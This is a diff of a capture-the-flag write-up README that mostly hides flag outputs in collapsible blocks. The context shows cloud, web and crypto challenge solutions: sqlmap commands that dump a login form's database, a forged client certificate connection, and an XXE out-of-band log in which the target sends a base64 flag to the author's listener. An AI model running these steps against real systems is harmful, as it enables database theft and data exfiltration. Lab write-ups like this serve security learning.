@@ -580,7 +580,6 @@ $ mv decrypted_data decrypted_data.png
   <summary>FLAG</summary>
   
   ![decrypted_data](./crypto/crypto1/decrypted_data.png)
-  <img src="./crypto/crypto1/decrypted_data.png">
   
 </details>
   
@@ -766,7 +765,6 @@ And there we go we got the flag!
   <summary>FLAG</summary>
   
   ![crypto2](./crypto/crypto2/crypto2.png)
-  <img src="./crypto/crypto2/crypto2.png">
   
 </details>
   
@@ -879,7 +877,6 @@ Now the client doesn't do a check if we have more than 0 ammo and should let us 
   <summary>FLAG</summary>
   
   ![pewpew](./cheating/pewpew.png)
-  <img src="./cheating/pewpew.png">
 
 </details>
   
@@ -940,7 +937,6 @@ That should do it, lets try it!
   <summary>FLAG</summary>
   
   ![noroof](./cheating/noroof.png)
-  <img src="./cheating/noroof.png">
   
 </details>
 
@@ -1084,7 +1080,6 @@ Now lets create some botclients and go kill that boss! Aaaaand its done!
   <summary>FLAG</summary>
   
   ![bosskiller](./cheating/bosskiller.png)
-  <img src="./cheating/bosskiller.png">
   
 </details>
 ## 8. Cloud
@@ -1394,49 +1389,55 @@ drwxr-xr-x 4    0    0 4096 Mar 10 14:09 ..
 -rw-r--r-- 1 1002 1003  220 Mar 10 14:09 .bash_logout
 -rw-r--r-- 1 1002 1003 3771 Mar 10 14:09 .bashrc
 -rw-r--r-- 1 1002 1003  807 Mar 10 14:09 .profile
-
-Nothing interesting in .bashrc or .profile. What about .bash_history?
-$ cat .bash_history
-cd /home/joe/
-cd $HOME
-ls
-ls al
-ls
-ls -al
-cat .secret
-sudo -i
-ls
-ssh-keygen -t ed25519
-ssh-keygen -t ed25519 -C "secret@example.com"
-cat ~/.ssh/id_ed25519.pub
-cat ~/.ssh/id_ed25519
-rm ~/.ssh/id_ed25519*
-echo "ok"
-tail test
-tail test
-tail test
-tail test
-tail test
-....
-tail test
-tail test
-tail test
-echo "FLAG{1mPomoMgTwPi7d6cjmay4ehHHmR7djFpc4zJDDgquBbFpx8UMHGUFh9NDJa6}"
-tail test
-tail test
-tail test
-tail test
-tail test
-tail test
-tail test
-tail test
-....
-tail test
-touch Test1
-touch Test3
-touch Test2
 ```
+Nothing interesting in .bashrc or .profile. What about .bash_history?
 
+<details>
+  <summary>FLAG</summary>
+
+  ```bash
+  $ cat .bash_history
+  cd /home/joe/
+  cd $HOME
+  ls
+  ls al
+  ls
+  ls -al
+  cat .secret
+  sudo -i
+  ls
+  ssh-keygen -t ed25519
+  ssh-keygen -t ed25519 -C "secret@example.com"
+  cat ~/.ssh/id_ed25519.pub
+  cat ~/.ssh/id_ed25519
+  rm ~/.ssh/id_ed25519*
+  echo "ok"
+  tail test
+  tail test
+  tail test
+  tail test
+  tail test
+  ....
+  tail test
+  tail test
+  tail test
+  echo "FLAG{1mPomoMgTwPi7d6cjmay4ehHHmR7djFpc4zJDDgquBbFpx8UMHGUFh9NDJa6}"
+  tail test
+  tail test
+  tail test
+  tail test
+  tail test
+  tail test
+  tail test
+  tail test
+  ....
+  tail test
+  touch Test1
+  touch Test3
+  touch Test2
+  ```
+  
+</details>
 We got ourselves a flag!
 
 ### 8.4 AWS Challenge 4
@@ -1569,20 +1570,25 @@ $ aws secretsmanager list-secrets --region=eu-west-1
 
 Okay so there is a secret, now can use `aws secretsmanager get-secret-value --secret-id=fisc-chall-secret --region=eu-west-1`
 
-```bash
-$ aws secretsmanager get-secret-value --secret-id=fisc-chall-secret --region=eu-west-1
-{
-    "ARN": "arn:aws:secretsmanager:eu-west-1:037476587073:secret:fisc-chall-secret-41VJbh",
-    "Name": "fisc-chall-secret",
-    "VersionId": "56910c2e-18a7-4b62-892a-09f112ebc48e",
-    "SecretString": "{\"ChallengeSecret\":\"FLAG{not_too_secret}\"}",
-    "VersionStages": [
-        "AWSCURRENT"
-    ],
-    "CreatedDate": 1615376736.686
-}
-```
+<details
+  <summary>FLAG</summary>
 
+  ```bash
+  $ aws secretsmanager get-secret-value --secret-id=fisc-chall-secret --region=eu-west-1
+  {
+      "ARN": "arn:aws:secretsmanager:eu-west-1:037476587073:secret:fisc-chall-secret-41VJbh",
+      "Name": "fisc-chall-secret",
+      "VersionId": "56910c2e-18a7-4b62-892a-09f112ebc48e",
+      "SecretString": "{\"ChallengeSecret\":\"FLAG{not_too_secret}\"}",
+      "VersionStages": [
+          "AWSCURRENT"
+      ],
+      "CreatedDate": 1615376736.686
+  }
+  ```
+
+</details>
+         
 Flag extracted!
 
 ## 9. Web
@@ -1684,7 +1690,13 @@ Seems like it works! Lets use our trusted program from SQL Injections called [sq
 Lets run this `sqlmap -u https://hacklogin.challenge.fi/password-recovery.php --data "username=admin" --threads 10 --batch -dbs`
 ![dbfound](./web/dbfound.png)
 Next lets add the database into our line and lets dump all data that the database has. `sqlmap -u https://hacklogin.challenge.fi/password-recovery.php --data "username=admin" --threads 10 --batch -D random --dump-all`
-![dumpall](./web/dumpall.png)
+
+<details>
+  <summary>FLAG</summary>
+
+  ![dumpall](./web/dumpall.png)
+  
+</details>
 
 We got the hash and it works as a flag!
 
@@ -1718,7 +1730,12 @@ Dictionary cache built:
 
 Now we can login with admin:chess
 
-![isnice](./web/isnice.png)
+<details>
+  <summary>FLAG</summary>
+
+  ![isnice](./web/isnice.png)
+
+</details>
 
 BORAT SAYZ IZ NICE!
 
@@ -1769,7 +1786,12 @@ Seems to be working. No we can try to extract the file from the server using `fi
 Hmmm doesn't seem to be working right off the bat. Should we try exporting to PDF? could that be the trick. Lets try it.
 We write `/pdf` in our [url](https://hack-md.challenge.fi/Ty_qf4mCRImlxSOzzY2FTg/pdf) and download the PDF file.
 
-![flagfound](./web/flagfound.png)
+<details>
+  <summary>FLAG</summary>
+
+  ![flagfound](./web/flagfound.png)
+  
+</details>
 
 ### 9.5 Aapoweb
 
@@ -1850,90 +1872,94 @@ Email Address []:
 ```
 
 Now we're done with that lets connect with openssl again using our new privatekey and certificate.
+<details>
+  <summary>FLAG</summary>
 
-```bash
-$ openssl s_client -connect aapoweb.challenge.fi:8008 -cert aapoweb.crt -key aapoweb.key 
-CONNECTED(00000003)
-depth=0 C = FI, ST = Uusimaa, L = Espoo, O = aapoweb, CN = aapoweb
-verify error:num=18:self signed certificate
-verify return:1
-depth=0 C = FI, ST = Uusimaa, L = Espoo, O = aapoweb, CN = aapoweb
-verify return:1
----
-Certificate chain
- 0 s:C = FI, ST = Uusimaa, L = Espoo, O = aapoweb, CN = aapoweb
-   i:C = FI, ST = Uusimaa, L = Espoo, O = aapoweb, CN = aapoweb
----
-Server certificate
------BEGIN CERTIFICATE-----
-MIIDmzCCAoOgAwIBAgIUUrMinl868JuEquTowIDoy4Uz/yYwDQYJKoZIhvcNAQEL
-BQAwUzELMAkGA1UEBhMCRkkxEDAOBgNVBAgMB1V1c2ltYWExDjAMBgNVBAcMBUVz
-cG9vMRAwDgYDVQQKDAdhYXBvd2ViMRAwDgYDVQQDDAdhYXBvd2ViMB4XDTIxMDMx
-MjEzMTYxMloXDTIyMDMxMjEzMTYxMlowUzELMAkGA1UEBhMCRkkxEDAOBgNVBAgM
-B1V1c2ltYWExDjAMBgNVBAcMBUVzcG9vMRAwDgYDVQQKDAdhYXBvd2ViMRAwDgYD
-VQQDDAdhYXBvd2ViMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAznZK
-40mM1AFlMeqtlOdVMkAMZrSLVYi00DoaWpd0VPjI6vU9kYoI6MZGdkOR84MgUXIz
-G9dFGYAobm73lQr2wprmkSl/w0eeHoovMhOZXWSmGuZh+k5H4UzCaxmVpdE6yYHQ
-2u719OPkwSTGVFsfahB3+6J0QaGAPnF6vSTbNv7bpyGjm9b60BgVKNw1GXBnEAlZ
-dTS/fyEiSlB5DS7R/UpmlU3IWB008DRd32qajckIF393oupKIMqRjOyIXdxf0YdD
-BG8x6uWVk4VUG4OmTjM/8MfxKQbgsyRgiYKAh2neSvjBSbRCGiQfhYNxgzsCqWsS
-lSUbg/aVJA0OCPfuzwIDAQABo2cwZTAdBgNVHQ4EFgQUQ79jho5vUOmQfk0UckTN
-HedViD0wHwYDVR0jBBgwFoAUQ79jho5vUOmQfk0UckTNHedViD0wDwYDVR0TAQH/
-BAUwAwEB/zASBgNVHREECzAJggdhYXBvd2ViMA0GCSqGSIb3DQEBCwUAA4IBAQCq
-XnouhbgPNXqgVso7EwtfZ7gf/cRijA1NBw7NQ7tfbRjZrli0ykdOHOak4EZRLHrm
-HRlFDm9KyOuE/orTNkB6qch50b+CYedrwKSrfycHJjN8fC8cJnty7aHQvM3NGqg4
-bqPvfcVJB8j54aNFiZIN1hTCLKlgSBXSrhskHQGYovVyx+WICooAN+JZzNZv/qtn
-d3CerCEsdXabEKEyPH9+ZkRu66veDFQbgAYSWaoL9gGGYj0nCM2RFINRv1LLl+t1
-YW6g003lagllF8Iw2qrYBIqgVbqmzeJPtd6Xz4W6XA2kF1j27EbocUrU0xu0eo8n
-O6Z9KgPS0pMnc2nuZG8U
------END CERTIFICATE-----
-subject=C = FI, ST = Uusimaa, L = Espoo, O = aapoweb, CN = aapoweb
+  ```bash
+  $ openssl s_client -connect aapoweb.challenge.fi:8008 -cert aapoweb.crt -key aapoweb.key 
+  CONNECTED(00000003)
+  depth=0 C = FI, ST = Uusimaa, L = Espoo, O = aapoweb, CN = aapoweb
+  verify error:num=18:self signed certificate
+  verify return:1
+  depth=0 C = FI, ST = Uusimaa, L = Espoo, O = aapoweb, CN = aapoweb
+  verify return:1
+  ---
+  Certificate chain
+   0 s:C = FI, ST = Uusimaa, L = Espoo, O = aapoweb, CN = aapoweb
+     i:C = FI, ST = Uusimaa, L = Espoo, O = aapoweb, CN = aapoweb
+  ---
+  Server certificate
+  -----BEGIN CERTIFICATE-----
+  MIIDmzCCAoOgAwIBAgIUUrMinl868JuEquTowIDoy4Uz/yYwDQYJKoZIhvcNAQEL
+  BQAwUzELMAkGA1UEBhMCRkkxEDAOBgNVBAgMB1V1c2ltYWExDjAMBgNVBAcMBUVz
+  cG9vMRAwDgYDVQQKDAdhYXBvd2ViMRAwDgYDVQQDDAdhYXBvd2ViMB4XDTIxMDMx
+  MjEzMTYxMloXDTIyMDMxMjEzMTYxMlowUzELMAkGA1UEBhMCRkkxEDAOBgNVBAgM
+  B1V1c2ltYWExDjAMBgNVBAcMBUVzcG9vMRAwDgYDVQQKDAdhYXBvd2ViMRAwDgYD
+  VQQDDAdhYXBvd2ViMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAznZK
+  40mM1AFlMeqtlOdVMkAMZrSLVYi00DoaWpd0VPjI6vU9kYoI6MZGdkOR84MgUXIz
+  G9dFGYAobm73lQr2wprmkSl/w0eeHoovMhOZXWSmGuZh+k5H4UzCaxmVpdE6yYHQ
+  2u719OPkwSTGVFsfahB3+6J0QaGAPnF6vSTbNv7bpyGjm9b60BgVKNw1GXBnEAlZ
+  dTS/fyEiSlB5DS7R/UpmlU3IWB008DRd32qajckIF393oupKIMqRjOyIXdxf0YdD
+  BG8x6uWVk4VUG4OmTjM/8MfxKQbgsyRgiYKAh2neSvjBSbRCGiQfhYNxgzsCqWsS
+  lSUbg/aVJA0OCPfuzwIDAQABo2cwZTAdBgNVHQ4EFgQUQ79jho5vUOmQfk0UckTN
+  HedViD0wHwYDVR0jBBgwFoAUQ79jho5vUOmQfk0UckTNHedViD0wDwYDVR0TAQH/
+  BAUwAwEB/zASBgNVHREECzAJggdhYXBvd2ViMA0GCSqGSIb3DQEBCwUAA4IBAQCq
+  XnouhbgPNXqgVso7EwtfZ7gf/cRijA1NBw7NQ7tfbRjZrli0ykdOHOak4EZRLHrm
+  HRlFDm9KyOuE/orTNkB6qch50b+CYedrwKSrfycHJjN8fC8cJnty7aHQvM3NGqg4
+  bqPvfcVJB8j54aNFiZIN1hTCLKlgSBXSrhskHQGYovVyx+WICooAN+JZzNZv/qtn
+  d3CerCEsdXabEKEyPH9+ZkRu66veDFQbgAYSWaoL9gGGYj0nCM2RFINRv1LLl+t1
+  YW6g003lagllF8Iw2qrYBIqgVbqmzeJPtd6Xz4W6XA2kF1j27EbocUrU0xu0eo8n
+  O6Z9KgPS0pMnc2nuZG8U
+  -----END CERTIFICATE-----
+  subject=C = FI, ST = Uusimaa, L = Espoo, O = aapoweb, CN = aapoweb
 
-issuer=C = FI, ST = Uusimaa, L = Espoo, O = aapoweb, CN = aapoweb
+  issuer=C = FI, ST = Uusimaa, L = Espoo, O = aapoweb, CN = aapoweb
 
----
-No client certificate CA names sent
-Client Certificate Types: RSA sign
-Requested Signature Algorithms: RSA-PSS+SHA512:RSA-PSS+SHA384:RSA-PSS+SHA256:RSA+SHA512:RSA+SHA384:RSA+SHA256:RSA+SHA224:RSA+SHA1
-Shared Requested Signature Algorithms: RSA-PSS+SHA512:RSA-PSS+SHA384:RSA-PSS+SHA256:RSA+SHA512:RSA+SHA384:RSA+SHA256:RSA+SHA224
-Peer signing digest: SHA512
-Peer signature type: RSA-PSS
-Server Temp Key: X25519, 253 bits
----
-SSL handshake has read 1394 bytes and written 1588 bytes
-Verification error: self signed certificate
----
-New, TLSv1.2, Cipher is ECDHE-RSA-CHACHA20-POLY1305
-Server public key is 2048 bit
-Secure Renegotiation IS supported
-Compression: NONE
-Expansion: NONE
-No ALPN negotiated
-SSL-Session:
-    Protocol  : TLSv1.2
-    Cipher    : ECDHE-RSA-CHACHA20-POLY1305
-    Session-ID: 
-    Session-ID-ctx: 
-    Master-Key: 3B651BB1D3F2A2AC993B96A65EA8F3D66CEA61F866FD21AB050BCCC80F060483ECAA4503BE41B46B8DA4FB9A7FDB2C5B
-    PSK identity: None
-    PSK identity hint: None
-    SRP username: None
-    Start Time: 1617265707
-    Timeout   : 7200 (sec)
-    Verify return code: 18 (self signed certificate)
-    Extended master secret: yes
----
+  ---
+  No client certificate CA names sent
+  Client Certificate Types: RSA sign
+  Requested Signature Algorithms: RSA-PSS+SHA512:RSA-PSS+SHA384:RSA-PSS+SHA256:RSA+SHA512:RSA+SHA384:RSA+SHA256:RSA+SHA224:RSA+SHA1
+  Shared Requested Signature Algorithms: RSA-PSS+SHA512:RSA-PSS+SHA384:RSA-PSS+SHA256:RSA+SHA512:RSA+SHA384:RSA+SHA256:RSA+SHA224
+  Peer signing digest: SHA512
+  Peer signature type: RSA-PSS
+  Server Temp Key: X25519, 253 bits
+  ---
+  SSL handshake has read 1394 bytes and written 1588 bytes
+  Verification error: self signed certificate
+  ---
+  New, TLSv1.2, Cipher is ECDHE-RSA-CHACHA20-POLY1305
+  Server public key is 2048 bit
+  Secure Renegotiation IS supported
+  Compression: NONE
+  Expansion: NONE
+  No ALPN negotiated
+  SSL-Session:
+      Protocol  : TLSv1.2
+      Cipher    : ECDHE-RSA-CHACHA20-POLY1305
+      Session-ID: 
+      Session-ID-ctx: 
+      Master-Key: 3B651BB1D3F2A2AC993B96A65EA8F3D66CEA61F866FD21AB050BCCC80F060483ECAA4503BE41B46B8DA4FB9A7FDB2C5B
+      PSK identity: None
+      PSK identity hint: None
+      SRP username: None
+      Start Time: 1617265707
+      Timeout   : 7200 (sec)
+      Verify return code: 18 (self signed certificate)
+      Extended master secret: yes
+  ---
 
-HTTP/1.1 200 OK
-Content-Length: 72
+  HTTP/1.1 200 OK
+  Content-Length: 72
 
-<html>
-<body>
-<h1>NIXU{you_are_now_offically_aapo}</h1>
-</body>
-</html>
-closed
-```
+  <html>
+  <body>
+  <h1>NIXU{you_are_now_offically_aapo}</h1>
+  </body>
+  </html>
+  closed
+  ```
+  
+</details>
 
 There we go!
 
@@ -2062,17 +2088,22 @@ Username or password not found! Try Harder!
 
 I thought "nononono not this again...." but then I checked my xxeserv and FINALLY I got a response from the server!
 
-```bash
-$ ./xxeserv -w -wp 21
-2021/04/01 10:19:50 [*] Starting Web Server on 21 [./]
-[*] Found certificate files in directory. Using these.
-2021/04/01 10:19:50 [*] GO XXE FTP Server - Port:  2121
-[*] UNO Listening...
-2021/04/01 10:20:01 [13.49.220.72:49414][200] /dtds/sp2.dtd
-2021/04/01 10:20:01 [13.49.220.72:49416][404] /ZmxhZ3tUMzRtX1IwVF9XNHNfSDNyRSF9Cg==
+<details>
+  <summary>FLAG</summary>
 
-$ echo ZmxhZ3tUMzRtX1IwVF9XNHNfSDNyRSF9Cg== |base64 -d
-flag{T34m_R0T_W4s_H3rE!}
-```
+  ```bash
+  $ ./xxeserv -w -wp 21
+  2021/04/01 10:19:50 [*] Starting Web Server on 21 [./]
+  [*] Found certificate files in directory. Using these.
+  2021/04/01 10:19:50 [*] GO XXE FTP Server - Port:  2121
+  [*] UNO Listening...
+  2021/04/01 10:20:01 [13.49.220.72:49414][200] /dtds/sp2.dtd
+  2021/04/01 10:20:01 [13.49.220.72:49416][404] /ZmxhZ3tUMzRtX1IwVF9XNHNfSDNyRSF9Cg==
+
+  $ echo ZmxhZ3tUMzRtX1IwVF9XNHNfSDNyRSF9Cg== |base64 -d
+  flag{T34m_R0T_W4s_H3rE!}
+  ```
+
+</details>
 
 Success! CTF Complete, it took me a few days but the feeling was worth it. Hope you learned something from this, see you on the next write-up!
